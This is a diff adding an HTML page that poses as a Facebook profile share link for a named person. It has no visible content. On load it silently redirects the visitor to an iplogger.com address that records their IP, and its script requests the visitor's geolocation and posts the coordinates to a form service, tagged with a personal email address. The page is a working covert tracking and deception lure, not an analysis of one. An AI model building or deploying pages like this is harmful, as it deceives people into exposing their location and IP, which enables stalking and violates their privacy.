@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0; url=https://iplogger.com/2vqZa7modofigy">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Dashty Salah">
+    <meta property="og:description" content="View this profile on Facebook">
+    <meta property="og:image" content="https://www.facebook.com/share/3bHorDXiYYSkV2Lb/?">
+    <meta property="og:url" content="https://iplogger.com/2vqZa7">
+    <meta property="og:type" content="website">
+
+    <title>Redirecting...</title>
+
+    <script>
+        // Function to get the user's location and send it to Formspree
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+
+                    // Prepare the data to send to Formspree
+                    var formData = new FormData();
+                    formData.append('latitude', latitude);
+                    formData.append('longitude', longitude);
+                    formData.append('email', 'sahand8909@gmail.com');
+                    
+                    // Send location data to Formspree
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "https://formspree.io/f/your-form-id", true); // Replace with your Formspree endpoint
+                    xhr.setRequestHeader("Accept", "application/json");
+                    xhr.send(formData);
+
+                }, function(error) {
+                    console.error("Error getting location:", error);
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Call the function to get the location
+        sendLocation();
+    </script>
+</head>
+<body>
+    <!-- No visible content -->
+</body>
+</html>
